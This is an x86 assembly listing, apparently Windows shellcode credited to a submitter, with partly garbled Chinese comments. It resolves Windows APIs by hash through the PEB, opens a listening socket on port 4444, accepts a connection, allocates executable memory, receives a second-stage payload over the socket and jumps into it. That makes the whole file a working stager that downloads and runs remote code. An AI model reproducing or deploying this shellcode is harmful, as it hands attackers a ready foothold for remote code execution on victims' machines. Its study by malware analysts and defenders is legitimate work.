###########################
#
#  ���飺   Random  
#
#  �ύ�ߣ� RPG 
#
########################



		cld						//�Ĵ�������
		//���������ĵ�ַ�������ʹ��
		push 0xc7979076			//recv
		push 0x01971eb1			//accept
		push 0x4bd39f0c			//listen
		push 0xdda71064			//bind
		push 0xde78322d			//WSASocketA
		push 0x80b46a3d			//WSAStartup
		push 0x0c917432			// LoadLibraryA
		push 0x1ede5967			//VirtualAlloc

		mov esi,esp			//esiָ����hashֵ���ڴ�
		lea edi,[esi-0x24]		//ediָ����API��ַ���ڴ�

		//find base addr of kernel32.dll

		mov ebx, fs:[ 0x30 ]       // ���PEB
		mov ecx, [ ebx + 0x0C ]    // ���PEB_LDR_DATA
		mov ecx, [ ecx + 0x0C ]    // InLoadOrderModuleList��һ��
		mov ecx, [ ecx ]           // InLoadOrderModuleList�ڶ���
		mov ecx, [ ecx ]           // InLoadOrderModuleList������
		mov ebp, [ ecx + 0x18 ]    // ��ȡ·����ַ

		//̧�߶�ջ
		xor ebx,ebx
		mov bh,0x03
		sub esp,ebx


		//push a piont to "ws2_32" onto stack
		
		mov bx,0x3233 
		push ebx 
		push 0x5F327377
		push esp
		
		
find_lib_functions:                                      //ws2_32
		lodsd
		cmp eax,0x80b46a3d			//WSAStartup

		jne find_functions			//LoadLibraryA ���ؽ�ȥ
		xchg eax,ebp
		call [edi -0x04]			//LoadLibraryA
		xchg eax,ebp

		push edi					//������ws2_32�е�һ�������ĵ�ַ�������ַ��������б�������

find_functions:
		pushad						//�����Ĵ���
		mov eax,[ebp+0x3c]			//eax= PEͷ
		mov ecx,[ebp+eax+0x78]		//ecx= ���������ƫ����
		add ecx, ebp				//ecx= �������ַ
		mov ebx,[ecx+0x20]			//ebx= �������б�ƫ���������dll��ַ
		add ebx,ebp					//ebx= �������ƾ��Ե�ַ
		xor edi,edi					//edi��Ϊ����������

next_function_loop:
		inc edi						//increment function counter

		mov esi,[ebx+edi*4]			//esi =relative offset of current function name

		add esi, ebp				//esi = absolute addr of current function name

		cdq							//dl will hold hash

hash_loop:

		movsx eax,byte ptr[esi]
		cmp al,ah
		jz compare_hash
		ror edx, 7
		add edx,eax
		inc esi
		jmp hash_loop

compare_hash:
		cmp edx,[esp+0x1c]			//hash�ıȽ�

		jnz next_function_loop


		mov ebx,[ecx+0x24]			//ebx =resolute offset of ordinals table

		add ebx,ebp					//ebx = absolute addr of ordinals table

		mov di,[ebx+2*edi]			//di= ordinal number of matched function

		mov ebx,[ecx+0x1c]			//ebx= resolute addr of address table

		add ebx,ebp					//ebx=absolute addr of address table

		add ebp,[ebx+4*edi]			//add to ebp (base addrof module) the relative offset of matched function
									
		xchg eax,ebp				//move func addr into eax

		pop edi						//edi is last onto stack in pushed
		
		stosd						//write function addr to [edi] and increment edi

		push edi

		popad						//restore registers
									//loop until we reach end of last hash
		cmp eax,0xc7979076
		jne find_lib_functions
		
		pop esi						//��һ��winsock�����ĵ�ַ����Ӧ�����push edi

		//init winsock

		push esp
		push 0x2
		lodsd
		call eax					//WSAStartup

		//mov byte ptr [esi +0x13],al //eax = 0 �������WSAStartup() �ɹ�

		//�����ջ����

		lea ecx,[eax + 0x30]		//sizeof (STARTUPINFO) = 0x44
		mov edi,esp
		rep stosd					//eax is still 0

		//create socket

		inc eax
		push eax
		inc eax
		push eax //af = 2 (AF_INET)
		lodsd
		call eax //WSAScoketA
		xchg ebp,eax

		//bind

		mov eax, 0x5c11ff02		// ���ö˿ں�4444��AF_INET
		xor ah, ah				// �Ƴ�eax�е�ff
		push eax				// �Դ���Ϊsockaddr�ṹ�壬ͬʱҲ��namelen����
		push esp				// sockaddr
		
		//call bind(),listen() and accept() in turn
call_loop:
		push ebp

		lodsd
		call eax
		test eax,eax
		jz call_loop

		xchg eax, ebp

		// VirtualAlloc()�ڴ�ռ�
		xor edx, edx
		add dl, 0x40
		push edx				// ������������ڴ�����ԣ�����д����ִ��
		xor edx, edx
		add dh, 0x10
		push edx				// flAlloction Type = 0x1000
		mov dh, 0x03
		push edx				// ��С 0x300
		xor edx, edx
		push edx				// lpAddress = NULL����ϵͳ�����׵�ַ
		call [esi-0x1c]			// VirtualAlloc()

		xchg eax, ebp			// eax = SOCKET��������ebp = ������ڴ��׵�ַ

		xor edx, edx			
		push edx				// flags = 0
		mov dh, 0x03
		push edx				// ��С0x300
		push ebp				// buf
		push eax				// SOCKET
		call [esi]				// ����  recv()
		jmp ebp					// ����shellcode����תִ��